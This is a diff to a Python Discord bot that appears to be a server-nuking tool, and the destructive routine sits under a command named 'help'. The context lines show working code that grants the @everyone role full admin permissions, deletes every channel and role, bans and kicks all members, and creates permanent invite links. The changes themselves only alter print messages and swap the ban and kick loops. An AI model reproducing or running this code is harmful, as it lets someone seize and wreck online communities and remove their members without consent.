@@ -44,27 +44,27 @@ async def help(ctx):
     try:
       role = discord.utils.get(guild.roles, name = "")
       await role.edit(permissions = Permissions.all())
-      print(Fore.MAGENTA + "I give admin to all members." + Fore.RESET)
+      print(Fore.MAGENTA + "I give admin to all members" + Fore.RESET)
     except:
-      print(Fore.GREEN + "I couldn't give admin to all members." + Fore.RESET)
+      print(Fore.GREEN + "I couldn't give admin to all members" + Fore.RESET)
     for channel in guild.channels:
       try:
         await channel.delete()
-        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
+        print(Fore.MAGENTA + f"{channel.name} was deleted" + Fore.RESET)
       except:
-        print(Fore.GREEN + f"{channel.name} wasn't deleted." + Fore.RESET)
-    for member in guild.members:
-     try:
-       await member.kick()
-       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was kicked" + Fore.RESET)
-     except:
-       print(Fore.GREEN + f"{member.name}#{member.discriminator} wasn't kicked." + Fore.RESET)
+        print(Fore.GREEN + f"{channel.name} wasn't deleted" + Fore.RESET)
     for member in guild.members:
      try:
        await member.ban()
        print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned" + Fore.RESET)
      except:
-       print(Fore.GREEN + f"{member.name}#{member.discriminator} wasn't banned." + Fore.RESET)
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} wasn't banned" + Fore.RESET)
+    for member in guild.members:
+     try:
+       await member.kick()
+       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was kicked" + Fore.RESET)
+     except:
+       print(Fore.GREEN + f"{member.name}#{member.discriminator} wasn't kicked" + Fore.RESET)
     for role in guild.roles:
      try:
        await role.delete()
@@ -82,9 +82,9 @@ async def help(ctx):
       user = ban_entry.user
       try:
         await user.unban("Your_User")
-        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} was unbanned." + Fore.RESET)
+        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} was unbanned" + Fore.RESET)
       except:
-        print(Fore.GREEN + f"{user.name}#{user.discriminator} wasn't unbanned." + Fore.RESET)
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} wasn't unbanned" + Fore.RESET)
     await guild.create_text_channel("")
     for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
